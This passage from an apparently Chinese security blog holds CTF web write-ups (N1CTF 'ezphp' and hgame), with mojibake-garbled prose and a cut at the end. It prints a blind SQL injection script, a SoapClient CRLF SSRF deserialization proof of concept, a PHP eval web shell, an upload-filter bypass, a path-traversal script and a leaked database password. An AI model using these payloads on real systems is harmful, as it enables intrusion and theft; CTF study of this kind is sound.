class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addslashes_deep</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>) ? <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;addslashes_deep&#x27;</span>, <span class="variable">$value</span>) : <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_s</span>(<span class="params"><span class="variable">$length</span> = <span class="number">8</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$chars</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []&#123;&#125;&lt;&gt;~`+=,.;:/?&#x27;</span>;</span><br><span class="line">    <span class="variable">$password</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$length</span>; <span class="variable">$i</span>++ )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$password</span> .= <span class="variable">$chars</span>[ <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$chars</span>) - <span class="number">1</span>) ];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$password</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addsla_all</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_GET</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_GET</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_GET</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$_POST</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$_POST</span> = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_POST</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_COOKIE</span>   = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">        <span class="variable">$_REQUEST</span>  = <span class="title function_ invoke__">addslashes_deep</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">addsla_all</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå‘ç°viewså¯ä»¥åˆ—ç›®å½• è€Œä¸”é‡Œé¢æœ‰ä¸ªphpinfoå¯ä»¥æŸ¥çœ‹,å…¶ä»–ä¼¼ä¹æ²¡å•¥ç”¨.. ä¸¤ä¸ªäººä¸€å¼€å§‹éƒ½æ˜¯sqlæ³¨å…¥æ‹¿åˆ°adminçš„å¯†ç çš„.è™½ç„¶skyå¤§ä½¬å…¶å®æ ¹æœ¬æ²¡æœ‰ç”¨åˆ°è¿™ä¸ª.... ç»™ä¸ªè„šæœ¬..æˆ‘åªè·‘äº†ä¸ªè¡¨,å…¶ä»–çš„å¯ä»¥è‡ªå·±è·‘,åæ­£ä»€ä¹ˆéƒ½æ²¡æœ‰è¿‡æ»¤....</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line">cookie = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;10t38onft8uf1dv1p15ro7vjr5&#x27;</span>&#125;</span><br><span class="line">ok = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">    ok=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">129</span>):</span><br><span class="line">        payload = <span class="string">&quot;aaa`,if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;num&#125;,1))=&#123;char&#125;),sleep(3),1))#&quot;</span>.<span class="built_in">format</span>(num=num,char=char)</span><br><span class="line">        data = &#123;<span class="string">&#x27;signature&#x27;</span>:payload,<span class="string">&#x27;mood&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r=u.post(<span class="string">&#x27;http://119.28.22.85:23333/index.php?action=publish&#x27;</span>,data=data,cookies=cookie,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(char),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char==<span class="number">128</span>:</span><br><span class="line">            ok=<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> ok == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h4 id="å…ˆçœ‹skyå¤§ä½¬çš„åšæ³•">å…ˆçœ‹skyå¤§ä½¬çš„åšæ³•</h4><p>skyå¤§ä½¬æ˜¯çœ‹äº†session.upload_progress.enabledå¼€å¯ä¹‹å,åŒ…å«session,ä½†æ˜¯å› ä¸ºcleanupå¼€å¯,æ‰€ä»¥æ¡ä»¶ç«äº‰å‘åŒ…æ‹¿shell ä¸€ä¸ªå‘sessionåŒ… <img src="/images/2018/03/ezphp-sky-1.jpg" alt="blacsheep" /> å¦ä¸€ä¸ªè¯·æ±‚session <img src="/images/2018/03/ezphp-sky-2.jpg" alt="blacsheep" /> è¿‡ä¸€æ®µæ—¶é—´å»appç›®å½•æ‹¿èœåˆ€è¿ä¸€ä¸‹ <img src="/images/2018/03/ezphp-sky-3.jpg" alt="blacsheep" /> ç„¶åçœ‹ä¸€ä¸‹æ ¹ç›®å½•çš„run.sh æ‰¾åˆ°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -e &quot;use mysql;UPDATE user SET password=PASSWORD(&#x27;Nu1Lctf%#~:p&#x27;) WHERE user=&#x27;root&#x27;;FLUSH PRIVILEGES;&quot;</span><br></pre></td></tr></table></figure><p>ç„¶åå°±è¿ä¸€ä¸‹æ•°æ®åº“ <img src="/images/2018/03/ezphp-sky-4.jpg" alt="blacsheep" /> ç„¶åè¿ç€çœ‹ä¸€ä¸‹ <img src="/images/2018/03/ezphp-sky-5.jpg" alt="blacsheep" /> æ‹¿åˆ°flag:n1ctf{php_unserialize_ssrf_crlf_injection_is_easy:p} ssrf_crlf.... è¿™å°±æ˜æ˜¾éé¢„æœŸäº†...</p><h4 id="å®˜æ–¹wp">å®˜æ–¹wp</h4><p>å®˜æ–¹çš„æ–¹æ³•æ˜¯ååºåˆ—åŒ–é‚£é‡Œ,ä½¿ç”¨soapclientæ¥æ„é€ ssrf,ç„¶åé€šè¿‡crlfå‘åŒ…ç™»å½•,ä¼ é©¬æ‹¿shellçš„,åé¢çš„éƒ½æ˜¯ä¸€æ ·çš„,ä¸è¿‡æˆ‘è‡ªå·±å¤ç°çš„æ—¶å€™ä»æ¥éƒ½æ²¡æœ‰æˆåŠŸ...æ‰“äº†payloadä¹‹åè™½ç„¶å¯ä»¥ssrf(ç”¨vpsæ”¶åˆ°äº†å‘é€çš„åŒ…),ä½†æ˜¯cookieå¹¶æ²¡æœ‰ç”¨,å¤§æ¦‚æ˜¯ç„å­¦é—®é¢˜å§,åç»­ç­‰æœ‰æ—¶é—´å¤ç°æˆåŠŸäº†å†æ¥å¡«å‘å§...</p><h5 id="å½“å¤©æ™šä¸Šæ›´æ–°">å½“å¤©æ™šä¸Šæ›´æ–°</h5><p>æ‰“æŠŠæ–‡æ˜5æ„Ÿè§‰èˆ’æœå¤šäº†,å›æ¥æŠŠè¿™ä¸ªæ´å†æ‰“äº†ä¸€é,ç»ˆäºæ‰¾åˆ°äº†é—®é¢˜... è¿™é‡Œå°±æŠŠå®˜æ–¹çš„wpå¤ç°ä¸€ä¸‹å§ é¦–å…ˆ,soapclientäº†è§£ä¸€ä¸‹ çœ‹phpinfo,å‘ç°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">soap</span><br><span class="line"></span><br><span class="line">Soap Client =&gt; enabled</span><br><span class="line">Soap Server =&gt; enabled</span><br></pre></td></tr></table></figure><p>ç„¶åå­¦ä¹ ä¸€ä¸‹SoapClientçš„ç”¨æ³•,</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title class_">SoapClient</span>::<span class="variable constant_">SoapClient</span> ( <span class="keyword">mixed</span> <span class="variable">$wsdl</span> [, <span class="keyword">array</span> <span class="variable">$options</span> ] )</span><br></pre></td></tr></table></figure><p>ç„¶åç¬¬ä¸€ä¸ªwsdlæŒ‡çš„æ˜¯webæœåŠ¡å™¨çš„æè¿°è¯­è¨€,xmlä¹‹ç±»çš„ä¸œè¥¿,è¿™ä¸ªæ— æ‰€è°“,å¡«nullå°±å¥½,åé¢çš„å¯ä»¥æŒ‡å®šuser-agent,locationä¹‹ç±»çš„,ç»™ä¸ªä¾‹å­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$soapclient</span> = <span class="keyword">new</span> <span class="title function_ invoke__">soapclient</span>(<span class="string">&#x27;http://www.soap.com/soap.php?wsdl&#x27;</span>,</span><br><span class="line">    <span class="keyword">array</span>(<span class="string">&#x27;stream_context&#x27;</span> =&gt; <span class="title function_ invoke__">stream_context_create</span>(</span><br><span class="line">        <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;http&#x27;</span>=&gt; <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&#x27;PHP/SOAP&#x27;</span>)</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    )</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>è¿”å›çš„ä¿¡æ¯é‡Œuaå°±æ˜¯PHP/SOAPäº†,æœ€åè¿˜æœ‰ä¸ªuriå‚æ•°,ä¼šè¢«ä¼ åˆ°SoapActioné‡Œ,ä½†æ˜¯è¿™ä¸ªå‚æ•°è¦†ç›–ä¸äº†content-length,å°±ä¸èƒ½æ§åˆ¶æˆ‘ä»¬è¦çš„ç™»å½•,æ‰€ä»¥æˆ‘ä»¬é€‰æ‹©åœ¨uaé‚£é‡Œcrlf,æ–¹æ³•å¦‚ä¸‹: ç»™å‡ºå®˜æ–¹çš„poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://127.0.0.1/index.php?action=login&#x27;</span>;</span><br><span class="line"><span class="variable">$post_string</span> = <span class="string">&#x27;username=admin&amp;password=nu1ladmin&amp;code=2218631&#x27;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line"> <span class="string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;Cookie: PHPSESSID=4deuuh449h5p807s0nid2k6i75&#x27;</span></span><br><span class="line"> );</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36^^Content-Type: application/x-www-form-urlencoded^^&#x27;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="variable">$headers</span>).<span class="string">&#x27;^^Content-Length: &#x27;</span>.(<span class="keyword">string</span>)<span class="title function_ invoke__">strlen</span>(<span class="variable">$post_string</span>).<span class="string">&#x27;^^^^&#x27;</span>.<span class="variable">$post_string</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;aaab&quot;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;^^&#x27;</span>,<span class="string">&quot;\r\n&quot;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="variable">$aaa</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&amp;&#x27;</span>,<span class="string">&#x27;&amp;&#x27;</span>,<span class="variable">$aaa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é¦–å…ˆè‡ªå·±åˆ›å»ºä¸€ä¸ªå¸å·,æ’md5è„šæœ¬ç®€å•å†™ä¸€ä¸ªå°±å¥½ ç„¶åå»publishç•Œé¢å‘è¡¨,burpæŠ“åŒ…,å‘åˆ°repeater ç„¶åå†å¼€ä¸€ä¸ªæµè§ˆå™¨,æˆ–è€…æ¸…æ‰cookieä¹Ÿè¡Œ(æ¸…cookieçš„è¯è¯·æŠŠè¿”å›ä¸»ç•Œé¢çš„åŒ…ä¹ŸæŠ“äº†),åˆ·æ–°ä¸€ä¸‹è·å–ä¸€ä¸ªæ²¡æœ‰ç™»å½•çš„cookie,ç„¶åcodeè‡ªå·±è„šæœ¬æ’ä¸€ä¸‹,å†™åˆ°å‰é¢çš„phpè„šæœ¬é‡Œé¢,headersé‡Œé¢çš„cookieæ¢æ²¡æœ‰ç™»å½•çš„å·çš„cookie,å› ä¸ºç™»å½•æ˜¯ä½¿ç”¨æ–°çš„cookie,è·‘ä¸€ä¸‹,å¾—åˆ°ä¸€ä¸²hexç ,ç„¶åburpå‘åŒ… <img src="/images/2018/03/ez-php-official-1.jpg" alt="blacsheep" /> åœ¨signatureå¤„æ³¨å…¥,è¦†ç›–æ‰mood,ä½¿æˆ‘ä»¬çš„soapclientå¯¹è±¡å¯ä»¥ååºåˆ—åŒ–ä»è€Œå®Œæˆssrf (ä¹‹å‰å¾ˆè ¢,æ²¡æœ‰æ§code,æ‰€ä»¥ä¸€ç›´æ²¡æœ‰ç™»å½•æˆåŠŸ...XD..) æˆåŠŸpublishä¹‹åæˆ‘ä»¬å»è®¿é—®ä¸€ä¸‹indexè®©æˆ‘ä»¬çš„æ³¨å…¥ååºåˆ—åŒ–. ok,åˆ°è¿™é‡Œæˆ‘ä»¬å†æŠŠcookieæ¢æˆä¹‹å‰phpè„šæœ¬é‡Œå†™çš„cookieæˆ‘ä»¬å°±æ˜¯ç®¡ç†å‘˜äº† <img src="/images/2018/03/ez-php-official-2.jpg" alt="blacsheep" /> ç„¶åå®¡ä¸€ä¸‹ä¸Šä¼ çš„æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file_size</span>  = <span class="variable">$file</span>[<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_size</span>&gt;<span class="number">2</span>*<span class="number">1024</span>*<span class="number">1024</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;pic is too big!&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="variable">$file</span>[<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span>!=<span class="string">&quot;image/jpeg&quot;</span> &amp;&amp; <span class="variable">$file_type</span>!=<span class="string">&#x27;image/pjpeg&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;file type invalid&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_uploaded_file</span>(<span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$uploaded_file</span> = <span class="variable">$file</span>[<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$user_path</span> =  <span class="string">&quot;/app/adminpic&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$user_path</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_path</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>[<span class="string">&#x27;name&#x27;</span>])[<span class="string">&#x27;filename&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file_true_name</span>);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$file_true_name</span>);</span><br><span class="line">        <span class="variable">$file_true_name</span> = <span class="variable">$file_true_name</span>.<span class="title function_ invoke__">time</span>().<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">100</span>).<span class="string">&#x27;.jpg&#x27;</span>;</span><br><span class="line">        <span class="variable">$move_to_file</span> = <span class="variable">$user_path</span>.<span class="string">&quot;/&quot;</span>.<span class="variable">$file_true_name</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_file</span>,<span class="variable">$move_to_file</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$move_to_file</span>),<span class="string">&#x27;&lt;?php&#x27;</span>)&gt;=<span class="number">0</span>)</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&#x27;sh /home/nu1lctf/clean_danger.sh&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$file_true_name</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†™ä¸ªä¸€å¥è¯ä¸Šå»å°±å¥½äº†,å½“ç„¶æˆ‘ä»¬è¿˜å¾—ç»•è¿‡,ç„¶åè¿™é‡Œæä¾›ä¸¤ç§æ€è·¯ ä¸€ç§æ˜¯å¸¸è§çš„<?phpç»•è¿‡,phpinfoä¸­å¯ä»¥çœ‹åˆ°å¼€äº†çŸ­æ ‡ç­¾,æ‰€ä»¥å¯ä»¥<=ç»•è¿‡ å½“ç„¶ä¹Ÿå¯ä»¥ç”¨å¸¸è§çš„<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; language=&#x27;php&#x27;&gt;eval($_POST[&#x27;cmd&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure></p><p>å¦å¤–ä¸€ç§æ˜¯å®˜æ–¹ç»™çš„,ç¬¬ä¸€æ¬¡è§,å­¦ä¹ ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Using a feature of commands of linux</span><br><span class="line">When we create a file like -xaaaaaaa.jpg</span><br><span class="line">We could not delete it by rm * or rm *.jpg except rm -r adminpic/</span><br></pre></td></tr></table></figure><p>å³æˆ‘ä»¬å¯ä»¥åœ¨.jpgæ–‡ä»¶å‰é¢åŠ ä¸Šä¸€ä¸ª-è®©æ–‡ä»¶ä¸è¢«åˆ é™¤ ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥ ä¼ å®Œäº†åœ¨è‡ªå·±å»æš´ç ´ä¸€ä¸‹mumaçš„åç§°å°±å¥½äº†,æ—¶é—´çš„è¯ç”¨æ—¶é—´è½¬æ—¶é—´æˆ³å°±å¥½,rand(1,100)æš´ç ´ä¸€ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    r=requests.get(<span class="string">&#x27;http://119.28.22.85:23333/index.php?action=../../../../../../app/adminpic/1muma1521034659&#123;num&#125;.jpg&#x27;</span>.<span class="built_in">format</span>(num=num))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(num)+<span class="string">&#x27;-&gt;&#x27;</span>+<span class="built_in">str</span>(r.status_code))</span><br></pre></td></tr></table></figure><p>ç„¶ååŒæ ·å¯ä»¥æ‹¿åˆ°shell,æ‹¿åˆ°shellä¹‹åå…¶ä»–çš„éƒ½æ˜¯ä¸€æ ·çš„äº†</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hgame-webwp</title>
      <link href="/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/"/>
      <url>/2018/02/22/hgame%E4%B8%89%E5%91%A8web%E9%A2%98%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h3 id="are-you-from-europe">Are you from Europe?</h3><p>cnssåŸé¢˜,å°±flagæ”¹äº†ä¸‹,å¯¹äº†,ä¼¼ä¹æ¦‚ç‡ä¹Ÿè¢«ä¿®æ”¹äº†....æ‰€ä»¥ä¸èƒ½é€šè¿‡æ”¹å‚æ•°çš„æ–¹å¼æ‹¿flagäº†.. flag:hgame{Th3\_Ch0seN\_0nE!}</p><h3 id="special-number">special number</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">include_once(&quot;flag.php&quot;);</span><br><span class="line">    if(isset($_GET[&#x27;key&#x27;]))&#123;</span><br><span class="line">        $pattern = &#x27;/^(?=.*[0-9].*)(?=.*[a-zA-Z].*).&#123;7,&#125;$/ &#x27;;</span><br><span class="line">        $key = $_GET[&#x27;key&#x27;];</span><br><span class="line">        if(preg_match($pattern,$key)===0)&#123;</span><br><span class="line">            echo &quot;æ ¼å¼é”™è¯¯&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $lock=&quot;******************&quot;;</span><br><span class="line">            $b = json_decode($key);</span><br><span class="line">            if($b==$lock)</span><br><span class="line">                echo $flag;</span><br><span class="line">            else</span><br><span class="line">                echo &quot;this is no special number&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è€ƒçš„å¼±ç±»å‹ 0eç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://118.25.18.223:10001/?key=0e123321123</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;pHp_w34k_typing_s000_e4sy&#125;</span><br></pre></td></tr></table></figure><h3 id="can-u-find-me">can u find me?</h3><p>æ˜ç¤ºrobots.txt æŸ¥çœ‹/f1aaaaaaaag.php æç¤ºç®¡ç†å‘˜æ‰å¯ä»¥æ‹¿flag æ”¹cookie hgame{78e01ee77a39ef4e}</p><h3 id="tell-me-what-you-want">tell me what you want</h3><p>getä¸€ä¸ªflag,å‘ç°è¦post,postä¹‹åæç¤ºè¦æ”¹xffç„¶åuaå•Šrefererå•Šä»€ä¹ˆçš„ä¸€å †ä¸œè¥¿ä¸å¤šå†™äº† hgame{For9e\_hTTp\_iS\_N0T\_HArd}</p><h3 id="æˆ‘ä»¬ä¸ä¸€æ ·">æˆ‘ä»¬ä¸ä¸€æ ·</h3><p>strcmp,æ•°ç»„ç»•è¿‡ hgame{g3t\_f14g\_is\_so0000\_ez}</p><h3 id="random">Random?</h3><p>.swpæ–‡ä»¶æ³„æ¼vim -r random.php.swpæ‹¿æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> (<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$public</span>;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;emmm&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$emmm</span> = <span class="title function_ 